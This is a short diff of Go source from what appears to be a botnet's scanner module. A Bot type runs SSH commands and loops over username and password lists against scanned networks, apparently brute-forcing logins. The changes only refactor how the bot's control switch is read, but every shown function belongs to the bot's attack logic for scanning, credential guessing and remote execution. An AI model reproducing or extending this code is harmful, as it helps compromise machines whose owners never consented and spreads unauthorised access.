@@ -261,7 +261,7 @@ func (b *Bot) sshExecute(comd string, isRoot bool) {
 }
 
 func setScanSwitch() {
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		setCall.CallBot.scanSwitch = true
 	}
 }
@@ -286,7 +286,7 @@ func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 				var isRun, isLogin bool
 				for user := range userList {
 					for paswd := range paswdList {
-						if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+						if callSwitch, keySwitch := SetupCaller(); keySwitch {
 							if isRun || callSwitch.CallBot.scanSwitch {
 								return true
 							}
@@ -313,13 +313,13 @@ func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 				}
 				continue
 			}
-			if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+			if callSwitch, keySwitch := SetupCaller(); keySwitch {
 				if callSwitch.CallBot.scanSwitch {
 					return true
 				}
 			}
 		}
-		if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+		if callSwitch, keySwitch := SetupCaller(); keySwitch {
 			if callSwitch.CallBot.scanSwitch {
 				return true
 			}
@@ -328,7 +328,7 @@ func (b *Bot) runScan(scanNetwork []string, isRandom bool, nCores string) bool {
 }
 
 func (b *Bot) Scanner() {
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		b.pServer = setCall.CallBot.pServer
 		if value, key := ScanMap[setCall.CallBot.scanOpt]; key {
 			/*
